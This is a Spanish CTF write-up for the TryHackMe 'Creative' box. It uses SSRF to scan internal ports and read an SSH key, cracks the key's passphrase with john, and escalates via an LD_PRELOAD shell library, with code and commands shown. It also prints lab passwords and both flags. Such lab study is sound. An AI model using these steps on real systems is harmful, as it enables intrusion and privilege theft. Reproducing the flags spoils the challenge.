Máquina Creative (TryHackMe)
1. Reconocimiento Inicial
Escaneo de Puertos (Nmap)

Se identificaron los servicios activos en la máquina objetivo:


`nmap -T4 -n -sC -sV -Pn -p- creative.thm`

Puertos abiertos:

    22: SSH (OpenSSH)

    80: HTTP (Nginx 1.18.0)

Enumeración de Subdominios

El escaneo reveló que el puerto 80 redirige a creative.thm. Se realizó una búsqueda de subdominios utilizando ffuf:


`ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://creative.thm/ -H "Host: FUZZ.creative.thm" -fw 6`

Hallazgo: Subdominio beta.creative.thm identificado.
2. Explotación
Descubrimiento de SSRF

En beta.creative.thm se encontró una funcionalidad de "URL Tester". Se confirmó que era vulnerable a SSRF (Server-Side Request Forgery). Se utilizó esta vulnerabilidad para escanear puertos internos:

<img width="733" height="181" alt="image" src="https://github.com/user-attachments/assets/c9dde8de-5784-4aef-b598-ce779cff0e5c" />


`ffuf -u 'http://beta.creative.thm/' -d "url=http://127.0.0.1:FUZZ/" -w <(seq 1 65535) -H 'Content-Type: application/x-www-form-urlencoded' -mc all -t 100 -fs 13`

Resultado: Se detectó un servidor web interno corriendo en el puerto 1337.
Obtención de Clave SSH

Utilizando el SSRF para explorar el sistema de archivos local (http://127.0.0.1:1337/home/saad/), se localizó la clave privada SSH del usuario saad:


# Ruta de la clave

http://127.0.0.1:1337/home/saad/.ssh/id_rsa

Cracking de Passphrase

La clave SSH estaba protegida por una contraseña. Se extrajo el hash y se crackeó con john:

`ssh2john.py id_rsa > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt`

Credencial obtenida: `sweetness`


3. Escalada de Privilegios
Enumeración de Usuario

Tras acceder vía SSH, se revisó el historial de comandos (.bash_history), encontrando las credenciales en texto plano del usuario:

`Usuario: saad`

`Contraseña: MyStrongestPasswordYet$4291`

Abuso de `LD_PRELOAD`

Al verificar los permisos de sudo (sudo -l), se observó la configuración env_keep+=LD_PRELOAD y permisos para ejecutar /usr/bin/ping:


```Matching Defaults entries for saad on creative:

env_reset, mail_badpass, env_keep+=LD_PRELOAD

Se creó una biblioteca compartida maliciosa en C para spawnear una shell:
C

// shell.c
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    system("/bin/sh");
}
```
Compilación y ejecución:


`gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/ping`

4. Flags y Finalización

User Flag:

`user.txt: 9a1ce90a7653d74ab98630b47b8b4a84`

cat /home/saad/user.txt

Root Flag:
`root.txt: 992bfd94b90da48634aed182aae7b99f`

# Aprendizaje

 a opción env_keep+=LD_PRELOAD permite que un usuario mantenga una variable de entorno que define qué bibliotecas se cargan antes que las demás.

<img width="217" height="74" alt="image" src="https://github.com/user-attachments/assets/578dd5ea-5f36-405a-aba9-410992977829" />

Riesgo: Si puedes ejecutar cualquier comando con sudo (como ping) y tienes LD_PRELOAD habilitado, puedes forzar al sistema a cargar una biblioteca maliciosa propia (.so) que ejecute una shell como root antes de que el comando original siquiera empiece.

Referencias
https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/
